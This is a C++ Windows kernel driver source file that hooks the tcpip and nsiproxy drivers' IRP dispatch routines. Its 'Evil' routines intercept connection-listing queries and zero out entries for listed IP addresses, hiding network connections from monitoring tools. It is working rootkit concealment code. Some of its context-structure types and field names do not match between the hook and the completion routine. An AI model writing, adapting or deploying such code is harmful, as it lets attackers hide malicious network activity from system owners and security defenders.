#include <intrin.h>
#include "irp.h"
#include "requests.h"
#pragma warning(disable : 4996)
#pragma warning(disable : 4302)
#pragma warning(disable : 4311)
#pragma warning(disable : 4127)
#define ENDING_PORT 0xFFFFFFFF  // Invalid port, put at ending of the list


// Global variables:
PVOID TcpIpDispatchTable[IRP_MJ_MAXIMUM_FUNCTION + 1] = { 0 };
PVOID NsiProxyDispatchTable[IRP_MJ_MAXIMUM_FUNCTION + 1] = { 0 };
PVOID AddressList = NULL;
ULONG64 AddressListSize = 0;
BOOL IsTcpIpHooked = FALSE;
BOOL IsNsiProxyHooked = FALSE;


NTSTATUS irphooking::address_list::InitializeAddressList() {
	ULONG EndingAddress = 0xFFFFFFFF;
	AddressList = ExAllocatePoolWithTag(NonPagedPool, sizeof(ULONG), 'AlIh');
	if (AddressList == NULL) {
		return STATUS_MEMORY_NOT_ALLOCATED;
	}
	AddressListSize += sizeof(ULONG);
	RtlCopyMemory(AddressList, &EndingAddress, sizeof(ULONG));
	DbgPrintEx(0, 0, "KMDFdriver IRP - Initialized hidden address list in %p\n", AddressList);
	return STATUS_SUCCESS;
}


NTSTATUS irphooking::address_list::AddToAddressList(ULONG IpAddress) {
	PVOID TemporaryAddressList = NULL;
	ULONG EndingAddress = ENDING_PORT;
	TemporaryAddressList = ExAllocatePoolWithTag(NonPagedPool, AddressListSize + sizeof(ULONG), 'AlIh');
	if (TemporaryAddressList == NULL) {
		return STATUS_MEMORY_NOT_ALLOCATED;
	}
	RtlCopyMemory(TemporaryAddressList, AddressList, AddressListSize - sizeof(ULONG));
	ExFreePool(AddressList);
	AddressList = TemporaryAddressList;
	RtlCopyMemory((PVOID)((ULONG64)AddressList + AddressListSize - sizeof(ULONG)), &IpAddress, sizeof(ULONG));
	RtlCopyMemory((PVOID)((ULONG64)AddressList + AddressListSize), &EndingAddress, sizeof(ULONG));
	AddressListSize += sizeof(ULONG);
	DbgPrintEx(0, 0, "KMDFdriver IRP - Added hidden IP address %lu to hidden list %p\n", IpAddress, AddressList);
	irphooking::address_list::ListAllHiddenAddresses();
	return STATUS_SUCCESS;
}


NTSTATUS irphooking::address_list::RemoveFromAddressList(ULONG RemoveAddress, USHORT RemoveIndex) {
	PVOID TemporaryAddressList = NULL;
	ULONG EndingAddress = ENDING_PORT;
	ULONG CurrentAddress = 0;
	USHORT AddressIndex = 0;
	USHORT InitialRemoveIndex = RemoveIndex;
	if (RemoveAddress == REMOVE_BY_INDEX_ADDR) {
		if (RemoveIndex >= (AddressListSize - sizeof(ULONG)) / sizeof(ULONG)) {
			return STATUS_INVALID_PARAMETER;
		}
	}
	else {
		if (RemoveAddress == 0 || RemoveAddress == ENDING_PORT) {
			return STATUS_INVALID_PARAMETER;
		}
		RtlCopyMemory(&CurrentAddress, (PVOID)((ULONG64)AddressList + (AddressIndex * sizeof(ULONG))), sizeof(ULONG));
		while (CurrentAddress != ENDING_PORT) {
			if (CurrentAddress == RemoveAddress) {
				RemoveIndex = AddressIndex;
				break;
			}
			AddressIndex++;
			RtlCopyMemory(&CurrentAddress, (PVOID)((ULONG64)AddressList + (AddressIndex * sizeof(ULONG))), sizeof(ULONG));
		}
		if (RemoveIndex == InitialRemoveIndex) {
			return STATUS_INVALID_PARAMETER;
		}
	}
	TemporaryAddressList = ExAllocatePoolWithTag(NonPagedPool, AddressListSize - sizeof(ULONG), 'AlIh');
	if (TemporaryAddressList == NULL) {
		return STATUS_MEMORY_NOT_ALLOCATED;
	}


	// Copy the existing data into the list without the removed address:
	if (RemoveIndex == 0) {
		RtlCopyMemory(TemporaryAddressList, (PVOID)((ULONG64)AddressList + sizeof(ULONG)), AddressListSize - sizeof(ULONG));
	}
	else if (RemoveIndex == (AddressListSize - (2 * sizeof(ULONG))) / sizeof(ULONG)) {
		RtlCopyMemory(TemporaryAddressList, AddressList, AddressListSize - (2 * sizeof(ULONG)));
		RtlCopyMemory((PVOID)((ULONG64)TemporaryAddressList + AddressListSize - (2 * sizeof(ULONG))),
			&EndingAddress, sizeof(ULONG));
	}
	else {
		RtlCopyMemory(TemporaryAddressList, AddressList, RemoveIndex * sizeof(ULONG));
		RtlCopyMemory((PVOID)((ULONG64)TemporaryAddressList + (RemoveIndex * sizeof(ULONG))),
			(PVOID)((ULONG64)AddressList + ((RemoveIndex + 1) * sizeof(ULONG))),
			AddressListSize - ((RemoveIndex + 1) * sizeof(ULONG)));
	}
	ExFreePool(AddressList);
	AddressList = TemporaryAddressList;
	AddressListSize -= sizeof(ULONG);
	return STATUS_SUCCESS;
}


NTSTATUS irphooking::address_list::ReturnAddressList(PVOID* AddressListOutput, ULONG64* AddressListSizeOutput) {
	if (AddressList == NULL || AddressListSize == 0) {
		return STATUS_UNSUCCESSFUL;
	}
	if (AddressListOutput != NULL) {
		*AddressListOutput = AddressList;
	}
	if (AddressListSizeOutput != NULL) {
		*AddressListSizeOutput = AddressListSize;
	}
	return STATUS_SUCCESS;
}


void irphooking::address_list::ListAllHiddenAddresses() {
	ULONG CurrentAddress = 0;
	USHORT AddressIndex = 0;
	WCHAR CurrentIpAddress[MAX_PATH] = { 0 };
	UNICODE_STRING CurrentUnicodeAddress = { 0 };

	if (AddressList != NULL && AddressListSize != 0) {
		DbgPrintEx(0, 0, "KMDFdriver IRP - Listing hidden IP addresses:\n");
		RtlCopyMemory(&CurrentAddress, AddressList, sizeof(ULONG));
		while (CurrentAddress != ENDING_PORT) {
			if(general_helpers::CalculateAddressString(CurrentIpAddress, CurrentAddress)){
				CurrentUnicodeAddress.Buffer = CurrentIpAddress;
				CurrentUnicodeAddress.Length = (USHORT)wcslen(CurrentIpAddress) * sizeof(WCHAR);
				CurrentUnicodeAddress.MaximumLength = (USHORT)(wcslen(CurrentIpAddress) + 1) * sizeof(WCHAR);
				DbgPrintEx(0, 0, "IP address number %hu: %wZ / 0x%X\n", AddressIndex,
					&CurrentUnicodeAddress, CurrentAddress);
				RtlZeroMemory(CurrentIpAddress, MAX_PATH);
			}
			else {
				DbgPrintEx(0, 0, "IP address number %hu: 0x%X, address unresolved\n", AddressIndex, 
					CurrentAddress);
			}
			AddressIndex++;
			RtlCopyMemory(&CurrentAddress, (PVOID)((ULONG64)AddressList + (AddressIndex * sizeof(ULONG))), sizeof(ULONG));
		}
		if (AddressIndex == 0) {
			DbgPrintEx(0, 0, "No hidden IP addresses\n");
		}
	}
	else {
		DbgPrintEx(0, 0, "KMDFdriver IRP - IP address list is uninitialized\n");
	}
}


BOOL irphooking::address_list::CheckIfInAddressList(ULONG CheckAddress, int* IndexInList) {
	ULONG CurrentAddress = 0;
	int AddressIndex = 0;
	if (AddressList == NULL || CheckAddress == ENDING_PORT) {
		if (IndexInList != NULL) {
			*IndexInList = -1;
		}
		return FALSE;  // Invalid address value / empty IP addresses list, nothing to hide
	}
	RtlCopyMemory(&CurrentAddress, AddressList, sizeof(ULONG));
	while (CurrentAddress != ENDING_PORT) {
		if (CurrentAddress == CheckAddress) {
			if (IndexInList != NULL) {
				*IndexInList = AddressIndex;
			}
			return TRUE;
		}
		AddressIndex++;
		RtlCopyMemory(&CurrentAddress, (PVOID)((ULONG64)AddressList + (AddressIndex * sizeof(ULONG))), sizeof(ULONG));
	}
	return FALSE;  // IP address does not exist in list
}


NTSTATUS irphooking::InitializeIrpHook(ULONG DriverTag, ULONG MajorFunction, PVOID HookingFunction) {
	UNICODE_STRING DriverName = { 0 };
	PDRIVER_OBJECT DriverObject = NULL;
	PVOID OriginalFunction = NULL;
	switch (DriverTag) {
	case TCPIP_TAG:
		if (!NT_SUCCESS(unicode_helpers::InitiateUnicode(L"\\Driver\\tcpip", 'TdTb',
			&DriverName)) || DriverName.Buffer == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver IRP - Cannot initiate unicode string for \\Driver\\tcpip\n");
			return STATUS_UNSUCCESSFUL;
		}
		break;

	case NSIPROXY_TAG:
		if (!NT_SUCCESS(unicode_helpers::InitiateUnicode(L"\\Driver\\nsiproxy", 'TdNb',
			&DriverName)) || DriverName.Buffer == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver IRP - Cannot initiate unicode string for \\Driver\\nsiproxy\n");
			return STATUS_UNSUCCESSFUL;
		}
		break;
	default:
		return STATUS_INVALID_PARAMETER;
	}
	DbgPrintEx(0, 0, "KMDFdriver IRP hook - trying to hook on driver %wZ\n", &DriverName);


	// Verify that IRP major function is not already hooked:
	if (wcscmp(DriverName.Buffer, L"\\Driver\\tcpip") == 0) {
		if (TcpIpDispatchTable[MajorFunction] != NULL) {
			DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ is already hooked\n", MajorFunction, &DriverName);
			unicode_helpers::FreeUnicode(&DriverName);
			return STATUS_UNSUCCESSFUL;
		}
	}
	else {  // (wcscmp(DriverName.Buffer, L"\\Driver\\nsiproxy") == 0) {
		if (NsiProxyDispatchTable[MajorFunction] != NULL) {
			DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ is already hooked\n", MajorFunction, &DriverName);
			unicode_helpers::FreeUnicode(&DriverName);
			return STATUS_UNSUCCESSFUL;
		}
	}
	DbgPrintEx(0, 0, "KMDFdriver IRP hook - Driver %wZ, major %lu has not been hooked yet\n", &DriverName, MajorFunction);


	// Get driver object, log IRP original function and hook the IRP function:
	DriverObject = general_helpers::GetDriverObjectADD(&DriverName);
	if (DriverObject == NULL) {
		DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ cannot be hooked, driver object cannot be resolved\n", MajorFunction, &DriverName);
		unicode_helpers::FreeUnicode(&DriverName);
		return STATUS_UNSUCCESSFUL;
	}
	DbgPrintEx(0, 0, "KMDFdriver IRP hook - Driver object is at %p\n", DriverObject);
	OriginalFunction = DriverObject->MajorFunction[MajorFunction];
	if (wcscmp(DriverName.Buffer, L"\\Driver\\tcpip") == 0) {
		TcpIpDispatchTable[MajorFunction] = DriverObject->MajorFunction[MajorFunction];
		DbgPrintEx(0, 0, "KMDFdriver IRP hook - Saved %lu of TcpIp.sys, %p\n", MajorFunction, DriverObject->MajorFunction[MajorFunction]);
		IsTcpIpHooked = TRUE;
	}
	else { // if (wcscmp(DriverName.Buffer, L"\\Driver\\nsiproxy") == 0) {
		NsiProxyDispatchTable[MajorFunction] = DriverObject->MajorFunction[MajorFunction];
		DbgPrintEx(0, 0, "KMDFdriver IRP hook - Saved %lu of NsiProxy.sys, %p\n", MajorFunction, DriverObject->MajorFunction[MajorFunction]);
		IsNsiProxyHooked = TRUE;
	}
	InterlockedExchange64((volatile long long*)(&(DriverObject->MajorFunction[MajorFunction])),
		(LONG64)HookingFunction);
	DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ was hooked successfully to %p, current value = %p\n",
		MajorFunction, &DriverName, HookingFunction, *(&(DriverObject->MajorFunction[MajorFunction])));
	if ((ULONG64)OriginalFunction == (ULONG64)*(&(DriverObject->MajorFunction[MajorFunction]))) {
		DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ failed, current value = original function (%p)\n", 
			MajorFunction, &DriverName, OriginalFunction);
		unicode_helpers::FreeUnicode(&DriverName);
		return STATUS_UNSUCCESSFUL;
	}
	if ((ULONG64)HookingFunction != (ULONG64)*(&(DriverObject->MajorFunction[MajorFunction]))) {
		DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ failed, current value (%p) != hooking function (%p)\n",
			MajorFunction, &DriverName, *(&(DriverObject->MajorFunction[MajorFunction])), OriginalFunction);
		unicode_helpers::FreeUnicode(&DriverName);
		return STATUS_UNSUCCESSFUL;
	}
	unicode_helpers::FreeUnicode(&DriverName);
	return STATUS_SUCCESS;
}


NTSTATUS irphooking::ReleaseIrpHook(ULONG DriverTag, ULONG MajorFunction) {
	UNICODE_STRING DriverName = { 0 };
	PDRIVER_OBJECT DriverObject = NULL;
	

	// Delete all remains of address list:
	if (AddressList != NULL) {
		ExFreePool(AddressList);
		AddressList = NULL;
	}


	// Set up parameters for unhooking:
	switch (DriverTag) {
	case TCPIP_TAG:
		if (!NT_SUCCESS(unicode_helpers::InitiateUnicode(L"\\Driver\\tcpip", 'TdTb',
			&DriverName)) || DriverName.Buffer == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver IRP - Cannot initiate unicode string for \\Driver\\tcpip\n");
			return STATUS_UNSUCCESSFUL;
		}
		if (!IsTcpIpHooked) {
			return STATUS_SUCCESS;
		}
		break;

	case NSIPROXY_TAG:
		if (!NT_SUCCESS(unicode_helpers::InitiateUnicode(L"\\Driver\\nsiproxy", 'TdNb',
			&DriverName)) || DriverName.Buffer == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver IRP - Cannot initiate unicode string for \\Driver\\nsiproxy\n");
			return STATUS_UNSUCCESSFUL;
		}
		if (!IsNsiProxyHooked) {
			return STATUS_SUCCESS;
		}
		break;

	default:
		return STATUS_INVALID_PARAMETER;
	}


	// Verify that IRP major function is not already hooked:
	if (wcscmp(DriverName.Buffer, L"\\Driver\\tcpip") == 0) {
		if (TcpIpDispatchTable[MajorFunction] == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ is not hooked when trying to release\n", MajorFunction, &DriverName);
			unicode_helpers::FreeUnicode(&DriverName);
			return STATUS_UNSUCCESSFUL;
		}
	}
	else if (wcscmp(DriverName.Buffer, L"\\Driver\\nsiproxy") == 0) {
		if (NsiProxyDispatchTable[MajorFunction] == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ is not hooked when trying to release\n", MajorFunction, &DriverName);
			unicode_helpers::FreeUnicode(&DriverName);
			return STATUS_UNSUCCESSFUL;
		}
	}


	// Get driver object and unhook the IRP function:
	DriverObject = general_helpers::GetDriverObjectADD(&DriverName);
	if (DriverObject == NULL) {
		DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ cannot be unhooked, driver object cannot be resolved\n", MajorFunction, &DriverName);
		unicode_helpers::FreeUnicode(&DriverName);
		return STATUS_UNSUCCESSFUL;
	}
	if (wcscmp(DriverName.Buffer, L"\\Driver\\tcpip") == 0) {
		InterlockedExchange64((LONG64*)(&(DriverObject->MajorFunction[MajorFunction])),
			(LONG64)TcpIpDispatchTable[MajorFunction]);
		IsTcpIpHooked = FALSE;
	}
	else if (wcscmp(DriverName.Buffer, L"\\Driver\\nsiproxy") == 0) {
		InterlockedExchange64((LONG64*)(&(DriverObject->MajorFunction[MajorFunction])),
			(LONG64)NsiProxyDispatchTable[MajorFunction]);
		IsNsiProxyHooked = FALSE;
	}
	DbgPrintEx(0, 0, "KMDFdriver IRP - Major function %lu of driver %wZ was unhooked successfully\n", MajorFunction, &DriverName);
	unicode_helpers::FreeUnicode(&DriverName);
	return STATUS_SUCCESS;
}


NTSTATUS irphooking::EvilCompletionNsiProxy(
	IN PDEVICE_OBJECT  DeviceObject,
	IN PIRP  Irp,
	IN PVOID  Context) {
	PIO_STACK_LOCATION IrpStackLocation = IoGetNextIrpStackLocation(Irp);
	KAPC_STATE ProcessApcState = { 0 };
	PHOOKED_IO_COMPLETION FakeContext = (PHOOKED_IO_COMPLETION)Context;
	PNSI_STRUCTURE_1 UserParameters = (PNSI_STRUCTURE_1)Irp->UserBuffer;
	PNSI_STRUCTURE_ENTRY NsiIPEntries = &(UserParameters->Entries->EntriesStart[0]);;
	int IndexOfAddressInList = -1;
	USHORT ZeroHideCount = 0;


	// Error before my driver:
	if (!NT_SUCCESS(Irp->IoStatus.Status)) {
		goto PassToNext;
	}


	// Address of IP entries buffer is not a valid address / entry size does not match the expected:
	if (!MmIsAddressValid(UserParameters->Entries)) {
		goto PassToNext;
	}
	if (UserParameters->EntrySize != sizeof(NSI_STRUCTURE_ENTRY)) {
		goto PassToNext;
	}


	// Attach to the requesting process and iterate IP address list:
	KeStackAttachProcess(FakeContext->RequestingProcess, &ProcessApcState);
	for (ULONG IpAddrIndex = 0; IpAddrIndex < UserParameters->NumberOfEntries; IpAddrIndex++) {
		if (irphooking::address_list::CheckIfInAddressList(NsiIPEntries[IpAddrIndex].IpAddress,
			&IndexOfAddressInList) && IndexOfAddressInList != -1) {
			
			// Found IP address to hide, zero memory out:
			if (NsiIPEntries[IpAddrIndex].IpAddress == 0) {
				ZeroHideCount++;
			}
			else {
				DbgPrintEx(0, 0, "KMDFdriver IRP - \\Driver\\nsiproxy device control, hiding ip 0x%X, index %lu, placement %lu in list\n",
					NsiIPEntries[IpAddrIndex].IpAddress, IpAddrIndex, (ULONG)IndexOfAddressInList);
			}
			RtlZeroMemory(&NsiIPEntries[IpAddrIndex], sizeof(NSI_STRUCTURE_ENTRY));
		}
	}
	if (ZeroHideCount > 0) {
		DbgPrintEx(0, 0, "KMDFdriver IRP - \\Driver\\nsiproxy device control, found and hid address 0x0 %hu times\n",
			ZeroHideCount);
	}
	KeUnstackDetachProcess(&ProcessApcState);
	

	// Provide the context and I/O  for the next IRP in the next driver in the stack:
	PassToNext:
	IrpStackLocation->Context = FakeContext->OriginalContext;
	IrpStackLocation->CompletionRoutine = FakeContext->OriginalCompletionRoutine;
	if (FakeContext->InvokeOnSuccess && IoGetNextIrpStackLocation(Irp)->CompletionRoutine) {
		ExFreePool(FakeContext);
		return IrpStackLocation->CompletionRoutine(DeviceObject, Irp, Context);
	}
	ExFreePool(FakeContext);
	if (Irp->PendingReturned) {
		IoMarkIrpPending(Irp);
	}
	return STATUS_SUCCESS;
}


NTSTATUS irphooking::EvilMajorDeviceControlNsiProxy(IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp) {
	ULONG IrpIoControlCode = 0;
	PIO_STACK_LOCATION IrpStackLocation = NULL;
	MajorDeviceControlNsiProxy MajorDeviceControlNsiProxyFunction = NULL;
	PHP_CONTEXT FakeContext = NULL;
	IrpStackLocation = IoGetCurrentIrpStackLocation(Irp);
	IrpIoControlCode = IrpStackLocation->Parameters.DeviceIoControl.IoControlCode;
	if (IrpIoControlCode == IOCTL_NSI_QUERYCONNS) {
		if (IrpStackLocation->Parameters.DeviceIoControl.InputBufferLength == NSI_PARAMS_LENGTH) {
			/*
			If call to driver is relevant to hiding ports :
			1) Hook the completion routine of the IRP
			2) When the IRP goes through the whole driver stack,
			it will call my completion routine that actually hides the ports
			*/
			FakeContext = (PHP_CONTEXT)ExAllocatePool(NonPagedPool, sizeof(HP_CONTEXT));
			if (FakeContext != NULL) {
				FakeContext->oldIocomplete = IrpStackLocation->CompletionRoutine;
				FakeContext->oldCtx = IrpStackLocation->Context;
				IrpStackLocation->CompletionRoutine = &irphooking::EvilCompletionNsiProxy;
				IrpStackLocation->Context = FakeContext;
				FakeContext->pcb = IoGetCurrentProcess();
				if ((IrpStackLocation->Control & SL_INVOKE_ON_SUCCESS) == SL_INVOKE_ON_SUCCESS) {
					FakeContext->bShouldInvolve = TRUE;
				}
				else {
					FakeContext->bShouldInvolve = FALSE;
				}
				IrpStackLocation->Control |= SL_INVOKE_ON_SUCCESS;  // Invoke CompletionRoutineHook when whole driver stack succeeded
			}
		}
	}


	// Call the original MajorDeviceControlNsiProxy (if got here it means that IRP_MJ_DEVICE_CONTROL in NsiDispatchTable is saved):
	MajorDeviceControlNsiProxyFunction = (MajorDeviceControlNsiProxy)NsiProxyDispatchTable[IRP_MJ_DEVICE_CONTROL];
	return MajorDeviceControlNsiProxyFunction(DeviceObject, Irp);
}